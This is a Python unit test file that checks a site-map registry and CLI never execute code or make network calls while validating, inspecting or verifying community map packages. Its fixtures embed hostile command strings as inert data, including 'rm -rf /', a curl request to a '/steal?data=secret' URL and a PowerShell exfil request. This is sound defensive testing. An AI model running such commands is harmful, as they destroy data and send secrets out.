from __future__ import annotations

from contextlib import redirect_stdout
import hashlib
import io
import json
import os
from pathlib import Path
import sys
import tempfile
import unittest
from unittest.mock import MagicMock, patch

ROOT = Path(__file__).resolve().parents[2]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from runewall.cli.main import main
from runewall.maps.registry import SiteMapRegistry

# ---------------------------------------------------------------------------
# Suspicious strings that must never be executed during validation/inspect/verify.
# They are placed inside JSON *string values* (descriptions, notes, etc.).
# The registry must treat them as opaque data and never evaluate them.
# ---------------------------------------------------------------------------
_SUSPICIOUS_DESCRIPTION = (
    "Run os.system('rm -rf /') or subprocess.run(['curl', 'http://example.com'])"
)
_SUSPICIOUS_NOTES = [
    "powershell.exe -Command Invoke-WebRequest http://example.com/exfil",
    "curl http://example.com/steal?data=secret",
    "rm -rf /tmp/important",
    "subprocess.Popen(['bash', '-c', 'evil'])",
]


# ---------------------------------------------------------------------------
# Fixture helpers
# ---------------------------------------------------------------------------

def _write_suspicious_community_map(path: Path) -> None:
    """Write a structurally *valid* community map whose text fields contain
    suspicious strings.  The registry should parse it safely."""
    content = {
        "site": "test_site",
        "flow": "test_flow",
        "action_type": "test.action",
        "description": _SUSPICIOUS_DESCRIPTION,
        "notes": _SUSPICIOUS_NOTES,
    }
    path.write_text(json.dumps(content, indent=2), encoding="utf-8")


def _write_execute_enabled_community_map(path: Path) -> None:
    """Write a community map that sets execute:true — must be *rejected* by
    validate, but no code should run during the rejection."""
    content = {
        "site": "test_site",
        "flow": "test_flow",
        "action_type": "test.action",
        "description": _SUSPICIOUS_DESCRIPTION,
        "execute": True,
    }
    path.write_text(json.dumps(content, indent=2), encoding="utf-8")


def _write_suspicious_package(pkg_dir: Path) -> None:
    """Create a minimal valid community map package containing suspicious strings
    in all free-text fields.  Checksums are computed from the actual file bytes."""
    map_filename = "suspicious_test.json"
    _write_suspicious_community_map(pkg_dir / map_filename)
    map_bytes = (pkg_dir / map_filename).read_bytes()
    checksum = hashlib.sha256(map_bytes).hexdigest()
    manifest = {
        "manifest_version": "1.0",
        "name": "suspicious-test-package",
        "version": "0.1.0",
        "description": (
            "Package description mentioning subprocess curl powershell behavior"
        ),
        "author": {"name": "Test Author"},
        "permissions": {
            "external_api_calls": False,
            "execute_enabled": False,
        },
        "safety": {
            "secrets_in_files": False,
            "dry_run_first": True,
            "community_execution_allowed": False,
        },
        "maps": [
            {
                "path": map_filename,
                "site": "test_site",
                "flow": "test_flow",
                "action_type": "test.action",
            }
        ],
        "checksums": {map_filename: checksum},
    }
    (pkg_dir / "manifest.json").write_text(json.dumps(manifest, indent=2), encoding="utf-8")


# ---------------------------------------------------------------------------
# Context-manager that blocks subprocess and httpx at the source
# ---------------------------------------------------------------------------

class _NetworkAndExecBlocked:
    """Patches subprocess and httpx so any call raises AssertionError.

    Use as a context manager.  After the with-block, call .assert_none_called()
    to verify no blocked function was reached.
    """

    def __init__(self) -> None:
        self._mocks: dict[str, MagicMock] = {}
        self._patches: list[Any] = []

    def __enter__(self) -> _NetworkAndExecBlocked:
        targets = [
            ("subprocess.run",   "subprocess.run must not be called during community map validation"),
            ("subprocess.call",  "subprocess.call must not be called during community map validation"),
            ("subprocess.Popen", "subprocess.Popen must not be called during community map validation"),
            ("os.system",        "os.system must not be called during community map validation"),
            ("httpx.get",        "httpx.get must not be called during community map validation"),
            ("httpx.post",       "httpx.post must not be called during community map validation"),
        ]
        for target, message in targets:
            mock = MagicMock(side_effect=AssertionError(message))
            p = patch(target, mock)
            p.start()
            self._patches.append(p)
            self._mocks[target] = mock
        return self

    def __exit__(self, *args: object) -> None:
        for p in self._patches:
            p.stop()

    def assert_none_called(self) -> None:
        for name, mock in self._mocks.items():
            mock.assert_not_called()


# ---------------------------------------------------------------------------
# Tests: community map file (validate / inspect)
# ---------------------------------------------------------------------------

class TestCommunityMapSafeDefault(unittest.TestCase):

    def test_validate_suspicious_map_does_not_exec(self) -> None:
        """Validating a map with suspicious strings must not call subprocess or httpx."""
        with tempfile.TemporaryDirectory() as temp_dir:
            map_path = Path(temp_dir) / "suspicious.json"
            _write_suspicious_community_map(map_path)
            registry = SiteMapRegistry()
            with _NetworkAndExecBlocked() as guard:
                report = registry.validate_community_map_file(map_path)
            guard.assert_none_called()
        # The map itself is structurally valid — suspicious content is just data.
        self.assertTrue(report.ok, f"unexpected errors: {report.errors}")
        self.assertEqual(report.errors, [])

    def test_inspect_suspicious_map_does_not_exec(self) -> None:
        with tempfile.TemporaryDirectory() as temp_dir:
            map_path = Path(temp_dir) / "suspicious.json"
            _write_suspicious_community_map(map_path)
            registry = SiteMapRegistry()
            with _NetworkAndExecBlocked() as guard:
                report = registry.inspect_community_map_file(map_path)
            guard.assert_none_called()
        self.assertTrue(report.ok)
        self.assertFalse(report.execute_enabled)
        self.assertFalse(report.contains_secrets)

    def test_validate_execute_enabled_map_is_rejected_without_exec(self) -> None:
        """A map with execute:true must be *rejected* during validation,
        but the rejection must not involve any code execution."""
        with tempfile.TemporaryDirectory() as temp_dir:
            map_path = Path(temp_dir) / "evil.json"
            _write_execute_enabled_community_map(map_path)
            registry = SiteMapRegistry()
            with _NetworkAndExecBlocked() as guard:
                report = registry.validate_community_map_file(map_path)
            guard.assert_none_called()
        # Must be rejected
        self.assertFalse(report.ok)
        self.assertTrue(
            any("execution" in e.lower() or "execute" in e.lower() for e in report.errors),
            f"expected execution-related error, got: {report.errors}",
        )

    def test_import_suspicious_map_does_not_exec(self) -> None:
        """Importing a valid (but suspicious-looking) map must only copy the file."""
        with tempfile.TemporaryDirectory() as temp_dir:
            map_path = Path(temp_dir) / "suspicious.json"
            _write_suspicious_community_map(map_path)
            registry = SiteMapRegistry()
            with _NetworkAndExecBlocked() as guard:
                report = registry.import_community_map_file(map_path, Path(temp_dir))
            guard.assert_none_called()
        self.assertTrue(report.ok)
        self.assertFalse(report.execute_enabled)

    # ------------------------------------------------------------------
    # Manifest validate
    # ------------------------------------------------------------------

    def test_manifest_validate_suspicious_strings_does_not_exec(self) -> None:
        with tempfile.TemporaryDirectory() as temp_dir:
            pkg_dir = Path(temp_dir)
            _write_suspicious_package(pkg_dir)
            registry = SiteMapRegistry()
            with _NetworkAndExecBlocked() as guard:
                report = registry.validate_manifest_file(pkg_dir / "manifest.json")
            guard.assert_none_called()
        self.assertTrue(report.ok, f"unexpected errors: {report.errors}")
        self.assertTrue(report.checksums_verified)

    # ------------------------------------------------------------------
    # Package inspect / verify
    # ------------------------------------------------------------------

    def test_package_inspect_suspicious_does_not_exec(self) -> None:
        with tempfile.TemporaryDirectory() as temp_dir:
            pkg_dir = Path(temp_dir)
            _write_suspicious_package(pkg_dir)
            registry = SiteMapRegistry()
            with _NetworkAndExecBlocked() as guard:
                report = registry.inspect_package_directory(pkg_dir)
            guard.assert_none_called()
        self.assertTrue(report.ok)
        self.assertTrue(report.checksums_verified)

    def test_package_verify_suspicious_does_not_exec(self) -> None:
        with tempfile.TemporaryDirectory() as temp_dir:
            pkg_dir = Path(temp_dir)
            _write_suspicious_package(pkg_dir)
            registry = SiteMapRegistry()
            with _NetworkAndExecBlocked() as guard:
                report = registry.verify_package_directory(pkg_dir)
            guard.assert_none_called()
        self.assertTrue(report.ok, f"unexpected errors: {report.errors}")
        self.assertTrue(report.checksums_verified)
        # execute_enabled is not a direct field on PackageVerifyReport,
        # but the manifest's execute_enabled=false must be reflected here.
        self.assertEqual(report.trusted_key_status, "not_applicable")

    # ------------------------------------------------------------------
    # CLI paths
    # ------------------------------------------------------------------

    def test_cli_package_verify_suspicious_does_not_exec(self) -> None:
        """End-to-end CLI test: runewall maps community package verify."""
        with tempfile.TemporaryDirectory() as temp_dir:
            pkg_dir = Path(temp_dir)
            _write_suspicious_package(pkg_dir)
            out = io.StringIO()
            with _NetworkAndExecBlocked() as guard:
                with redirect_stdout(out):
                    code = main(["maps", "community", "package", "verify", str(pkg_dir), "--json"])
            guard.assert_none_called()
        self.assertEqual(code, 0)
        data = json.loads(out.getvalue())
        self.assertTrue(data["ok"])

    def test_cli_manifest_validate_suspicious_does_not_exec(self) -> None:
        """End-to-end CLI test: runewall maps community manifest validate."""
        with tempfile.TemporaryDirectory() as temp_dir:
            pkg_dir = Path(temp_dir)
            _write_suspicious_package(pkg_dir)
            out = io.StringIO()
            with _NetworkAndExecBlocked() as guard:
                with redirect_stdout(out):
                    code = main([
                        "maps", "community", "manifest", "validate",
                        str(pkg_dir / "manifest.json"), "--json",
                    ])
            guard.assert_none_called()
        self.assertEqual(code, 0)
        data = json.loads(out.getvalue())
        self.assertTrue(data["ok"])

    def test_cli_community_map_validate_suspicious_does_not_exec(self) -> None:
        """End-to-end CLI test: runewall maps community validate."""
        with tempfile.TemporaryDirectory() as temp_dir:
            map_path = Path(temp_dir) / "suspicious.json"
            _write_suspicious_community_map(map_path)
            out = io.StringIO()
            with _NetworkAndExecBlocked() as guard:
                with redirect_stdout(out):
                    code = main(["maps", "community", "validate", str(map_path), "--json"])
            guard.assert_none_called()
        self.assertEqual(code, 0)
        data = json.loads(out.getvalue())
        self.assertTrue(data["ok"])

    def test_cli_community_map_inspect_suspicious_does_not_exec(self) -> None:
        """End-to-end CLI test: runewall maps community inspect."""
        with tempfile.TemporaryDirectory() as temp_dir:
            map_path = Path(temp_dir) / "suspicious.json"
            _write_suspicious_community_map(map_path)
            out = io.StringIO()
            with _NetworkAndExecBlocked() as guard:
                with redirect_stdout(out):
                    code = main(["maps", "community", "inspect", str(map_path), "--json"])
            guard.assert_none_called()
        self.assertEqual(code, 0)
        data = json.loads(out.getvalue())
        self.assertTrue(data["ok"])
        self.assertFalse(data["safety"]["execute_enabled"])
